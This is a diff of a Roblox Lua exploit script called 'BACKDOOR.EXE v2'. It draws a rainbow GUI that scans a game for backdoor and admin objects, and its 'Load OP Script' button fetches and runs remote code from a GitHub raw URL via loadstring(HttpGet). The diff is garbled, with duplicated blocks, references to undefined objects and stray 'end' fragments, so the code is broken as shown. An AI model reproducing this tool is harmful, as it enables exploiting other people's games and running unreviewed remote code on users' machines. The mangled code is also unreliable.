@@ -1,40 +1,139 @@
--- backdoor.exe by Ozil (with draggable UI)
+-- BACKDOOR.EXE v2 by Ozil | Rainbow GUI + Real Scanner
 
-local gui = Instance.new("ScreenGui", game.CoreGui)
-gui.Name = "backdoor.exe"
+local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
+local MainFrame = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local Title = Instance.new("TextLabel")
+local ScanButton = Instance.new("TextButton")
+local ConsoleButton = Instance.new("TextButton")
+local OpScriptButton = Instance.new("TextButton")
 
-local frame = Instance.new("Frame", gui)
-frame.Name = "MainFrame"
-frame.Size = UDim2.new(0,400,0,440)
-frame.Position = UDim2.new(0.5,-200,0.5,-220)
-frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
-frame.BorderSizePixel = 0
-Instance.new("UICorner", frame).CornerRadius = UDim.new(0,12)
-
-local title = Instance.new("TextLabel", frame)
-title.Text = "🧠 backdoor.exe - Scanner + Executor"
-title.Size = UDim2.new(1,0,0,40)
-title.Position = UDim2.new(0,0,0,0)
-title.BackgroundTransparency = 1
-title.TextColor3 = Color3.fromRGB(255,255,255)
-title.Font = Enum.Font.GothamBold
-title.TextSize = 20
-
--- Buttons (Scan, Console, OP Script)
-local buttons = { {text="🔍 Scan Game", y=50}, {text="🖥️ Open Console", y=95}, {text="💀 OP Script", y=140} }
-local btnInstances = {}
-for i, info in ipairs(buttons) do
-    local btn = Instance.new("TextButton", frame)
-    btn.Text = info.text
-    btn.Size = UDim2.new(0.9,0,0,35)
-    btn.Position = UDim2.new(0.05,0,0, info.y)
-    btn.BackgroundColor3 = Color3.fromRGB(40,40,40)
-    btn.TextColor3 = Color3.fromRGB(255,255,255)
-    btn.Font = Enum.Font.Gotham
-    btn.TextSize = 18
-    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,6)
-    btnInstances[info.text] = btn
+-- Rainbow Color Function
+local function RainbowColor()
+	local hue = tick() % 5 / 5
+	return Color3.fromHSV(hue, 1, 1)
 end
+
+-- GUI Properties
+MainFrame.Name = "BackdoorScanner"
+MainFrame.Parent = ScreenGui
+MainFrame.Size = UDim2.new(0, 350, 0, 230)
+MainFrame.Position = UDim2.new(0.5, -175, 0.5, -115)
+MainFrame.BackgroundColor3 = RainbowColor()
+MainFrame.Active = true
+MainFrame.Draggable = true
+
+UICorner.Parent = MainFrame
+
+Title.Name = "Title"
+Title.Parent = MainFrame
+Title.Text = "Backdoor.exe"
+Title.Font = Enum.Font.FredokaOne
+Title.TextSize = 25
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.BackgroundTransparency = 1
+
+local function CreateButton(name, posY, text, callback)
+	local btn = Instance.new("TextButton")
+	btn.Name = name
+	btn.Parent = MainFrame
+	btn.Position = UDim2.new(0.1, 0, 0, posY)
+	btn.Size = UDim2.new(0.8, 0, 0, 40)
+	btn.Text = text
+	btn.Font = Enum.Font.FredokaOne
+	btn.TextSize = 20
+	btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+	btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+	btn.MouseButton1Click:Connect(callback)
+	return btn
+end
+
+-- Scanner logic
+local function ScanGame()
+	local found = {}
+	local keywords = {"HD Admin", "Kohls", "Backdoor", "RemoteEvent", "require"}
+
+	for _, s in ipairs(game:GetDescendants()) do
+		for _, k in ipairs(keywords) do
+			if s:IsA("Folder") or s:IsA("ModuleScript") or s:IsA("RemoteEvent") or s:IsA("RemoteFunction") then
+				if string.find(string.lower(s.Name), string.lower(k)) then
+					table.insert(found, s:GetFullName())
+				end
+			end
+		end
+	end
+
+	if #found == 0 then
+		warn("[Scanner] No known backdoors or admin scripts found.")
+	else
+		warn("[Scanner] Found potential backdoors:")
+		for _, v in ipairs(found) do
+			warn(" - " .. v)
+		end
+	end
+end
+
+-- Add buttons
+CreateButton("Scan", 60, "Scan Game", ScanGame)
+CreateButton("Console", 110, "Open Console", function()
+	game:GetService("StarterGui"):SetCore("DevConsoleVisible", true)
+end)
+CreateButton("OP", 160, "Load OP Script", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/zazol666/scanner/refs/heads/main/backdoor", true))()
+end)
+
+-- Rainbow Background Loop
+task.spawn(function()
+	while true do
+		MainFrame.BackgroundColor3 = RainbowColor()
+		wait()
+	end
+end)OutputBox.TextSize = 14
+OutputBox.TextWrapped = true
+OutputBox.TextYAlignment = Enum.TextYAlignment.Top
+Instance.new("UICorner", OutputBox)
+
+-- Rainbow effect
+local function RainbowColor()
+    local h = tick() % 5 / 5
+    return Color3.fromHSV(h, 1, 1)
+end
+task.spawn(function()
+    while true do
+        MainFrame.BackgroundColor3 = RainbowColor()
+        task.wait()
+    end
+end)
+
+-- Scan for HD Admin
+ScanBtn.MouseButton1Click:Connect(function()
+    local found = false
+    for _, v in pairs(game:GetDescendants()) do
+        if v:IsA("Folder") and v.Name:lower():match("hdadmin") then
+            OutputBox.Text = "✅ Found HD Admin: " .. v:GetFullName()
+            found = true
+            break
+        end
+    end
+    if not found then
+        OutputBox.Text = "❌ No HD Admin folder found."
+    end
+end)
+
+-- Open Console
+ConsoleBtn.MouseButton1Click:Connect(function()
+    setclipboard("Press F9 or View > Console")
+    OutputBox.Text = "📋 Console tip copied to clipboard!"
+end)
+
+-- Load OP Script
+OpBtn.MouseButton1Click:Connect(function()
+    local s, e = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/zazol666/scanner/refs/heads/main/backdoor", true))()
+    end)
+    OutputBox.Text = s and "⚡ OP Script Loaded!" or ("❌ Failed: " .. e)
+end)end
 
 -- Scroll results
 local results = Instance.new("ScrollingFrame", frame)
